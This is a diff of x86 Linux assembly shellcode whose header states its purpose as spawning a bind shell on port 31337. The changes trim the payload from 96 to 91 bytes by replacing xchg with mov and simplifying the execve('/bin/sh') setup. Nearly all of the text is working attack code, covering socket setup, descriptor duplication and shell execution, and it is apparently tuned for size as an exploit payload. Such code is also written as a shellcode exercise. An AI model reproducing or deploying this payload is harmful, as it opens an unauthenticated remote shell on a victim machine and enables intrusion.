@@ -3,7 +3,7 @@
 ; Website:  http://www.whitedome.com.au/re4son
 ;
 ; Purpose: Spawn a bind shell on port 31337
-;          Rock Solid 96 byte version
+;          91 bytes
 
 
 global _start           
@@ -18,7 +18,7 @@ _start:
     mul ebx	    	; clear eax and edx
     mov bl, 0x1     	; store socket call identifier in bl
 
-    ; push socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=0) parameters
+    ; push socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6) parameters
     push 0x6
     push ebx
     push 0x2
@@ -77,7 +77,7 @@ _start:
     mov ecx, esp    	; store pointer to arguments in ecx
 
     ; issue system call
-    xchg eax, edi    	; store sys_socketcall system call number in eax, optimized way
+    mov eax, edi    	; store sys_socketcall system call number in eax
     int 0x80        	; execute system call
     xchg ebx, eax    	; store the new socket file descriptor in ebx for dup2
 
@@ -91,19 +91,12 @@ _start:
         jns loop
 
     ; execute /bin/sh
-    ; execve(*esp, [*esp, NULL], NULL);
-    xchg eax, edx   	; no need for edx after this
-    push eax        	; push NULL termination
+    ; execve("/bin/sh", 0, 0);
+    mov ecx, edx        ; clear ecx  
+    push edx        	; push NULL termination
     push 0x68732f2f 	; //sh (we can add a slash to make it four non NULL bytes)
     push 0x6e69622f 	; /bin
     mov ebx, esp    	; store address of /bin/sh
-
-    push eax        	; push NULL termination
-    push ebx        	; push pointer to /bin/sh 
-    mov ecx, esp    	; store pointer to arguments in ecx
-
-    push eax        	; push NULL termination
-    mov edx, esp    	; store pointer to empty envp array in edx
-
+  
     mov al, 0xb     	; store execve system call number in al  
     int 0x80        	; execute system call
